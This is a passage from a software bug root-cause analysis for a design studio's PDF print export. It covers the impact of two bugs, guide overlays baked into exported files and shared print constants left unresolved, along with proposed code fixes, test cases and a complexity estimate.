- Independently, **any** print-kind artboard whose designer had bleed/trim/margin guides toggled on in the editor will bake that decorative, app-only overlay (translucent red bleed tint, black trim line, magenta dashed margin line) into the shipped file — visible in every PDF viewer and print run, not just Maude.
- The two bugs compound in the reported case: the user got an export that *looks* like it has print markup (the guide overlay resembles crop-mark tooling at a glance) but is actually neither correct guide chrome (shouldn't be there) nor correct print marks (should be there) — worst of both.
- Severity: **High** for real print jobs — this is a design tool whose PDF-print feature is a headline capability (`39966b7f feat(studio): print artboards`); a silent no-op here means a user can send an unusable file to a print vendor without any error or warning. No crash, no console error, no `hooks.onProgress` failure — it degrades silently exactly because both code paths are written as "fail closed to null/skip, never throw."
- Workaround available today: repeat the print object inline per artboard (`print={{ paper: 'a1', orientation: 'portrait', bleedMm: 3 }}`) instead of referencing a shared const, and toggle the in-app print-guides overlay off before exporting. Neither is discoverable without reading this RCA or the source.

## Proposed Fix

1. **Bug A** — add `.dc-artboard-guides` to the `#canvas-hide-chrome` selector list in `plugins/design/templates/_shell.html` (alongside the other per-artboard overlay classes, e.g. near `.dc-artboard-label`). This is a one-line, no-risk fix — the class is exclusively the guides-overlay mount point (`artboard-guides-overlay.tsx:241`), nothing else uses it.
2. **Bug B** — widen `readArtboardPrintProp` (`apps/studio/canvas-edit.ts`) to resolve the common non-literal shapes without introducing real `eval`:
   - Unwrap `TSAsExpression`/`TSSatisfiesExpression` around the `print` prop's expression before the type check (handles `print={A1_PRINT as any}` once the identifier itself is also resolved — unwrapping alone isn't sufficient here).
   - When the (unwrapped) expression is an `Identifier`, resolve it against a **top-level `const X = {...}`** declared in the same module (mirror the existing `VariableDeclarator` scanning already used elsewhere in this file for other const-lookup cases, e.g. around lines 59/674/715/836) and read the initializer's `ObjectExpression` the same no-eval way. Keep it deliberately narrow — only a same-file, top-level, plain-object initializer resolves; anything else (imported constant, computed value, spread, function call) still returns `null` rather than guessing, preserving the "never disagree with what the export actually renders" invariant.
   - Add the equivalent unwrap in `applyPrintBoxesAndMarks`'s caller path only if other callers of `findAttribute(..., 'print')` exist elsewhere (grep first — at the time of this RCA it's PDF-export-only).
3. Once (2) lands, re-verify Bug A's fix and Bug B's fix together against `AlligatorsAcko.tsx` specifically — export both artboards as separate pages and confirm each page independently gets its own correct BleedBox/TrimBox + crop + registration marks, and that the guide-overlay tint/lines are absent regardless of the in-app toggle state.
4. Lower priority, same area: make the `SAFE_ARTBOARD_ID_RE` fallback in `safeArtboardFilename` (`apps/studio/bin/_pw-launch.mjs:126-131`) non-silent for the print-marks correlation path — e.g. have `exporters/pdf.ts` log/flag (via `hooks?.onProgress` or a warning surfaced in the export UI) when an `artboardId` it needs for `readArtboardPrintProp` came from the positional fallback rather than the real `id`, so a future ID-shape edge case fails loud instead of silently dropping marks on one page of a multi-page export.

## Testing Requirements

- `apps/studio/test/element-structural-edit.test.ts` — extend the `readArtboardPrintProp` describe block with:
  - `print={A1_PRINT}` and `print={A1_PRINT as any}` where `A1_PRINT` is a top-level `const … = {...} as const` → resolves to the same object as the equivalent inline literal.
  - `print={A1_PRINT}` where `A1_PRINT` is imported from another module → still `null` (must not silently succeed on an unresolvable reference).
  - `print={computePrint()}` (function call) and `print={{...A1_PRINT, bleedMm: 5}}` (spread) → still `null` (documents the intentional narrow-scope boundary).
- `apps/studio/test/pdf-print-boxes.test.ts` and/or `apps/studio/test/print-marks.test.ts` — add an end-to-end-ish case (two `kind="print"` artboards sharing one `print={SHARED as any}` const, multi-page export) asserting both pages get non-degenerate BleedBox/TrimBox and non-empty crop/registration mark geometry — this is the shape that shipped broken.
- `apps/studio/test/artboard-guides-overlay.test.tsx` or a new `canvas-hide-chrome` test (grep-based is fine, mirroring the existing selector-drift protections elsewhere in this repo, e.g. `test/canvas-origin-gate.test.ts`) — assert `.dc-artboard-guides` is present in `_shell.html`'s `#canvas-hide-chrome` block, so a future new overlay class regresses the same way this one did and gets caught immediately rather than by a user's print job.
- Manual/live verification once both fixes land: re-run the actual export against `/Users/iagh/git/alligators/.design/ui/AlligatorsAcko.tsx` (both artboards, "artboards as separate pages") and visually inspect the resulting PDF in a viewer that shows page boxes (or reopen in Acrobat/Preview and check for visible crop marks) — this is the concrete repro the user already has on disk.

## Complexity

**Low–Medium.** Bug A is a one-line CSS selector addition. Bug B is a small, well-scoped AST addition (unwrap + same-file top-level const resolution) inside a function that already does this class of no-eval AST work for other props elsewhere in the file — no new dependencies, no change to the pdf-lib post-pass itself. The multi-page loop needs no changes. Total surface: `plugins/design/templates/_shell.html` (1 line), `apps/studio/canvas-edit.ts` (`readArtboardPrintProp`, ~15-25 new lines), plus tests.
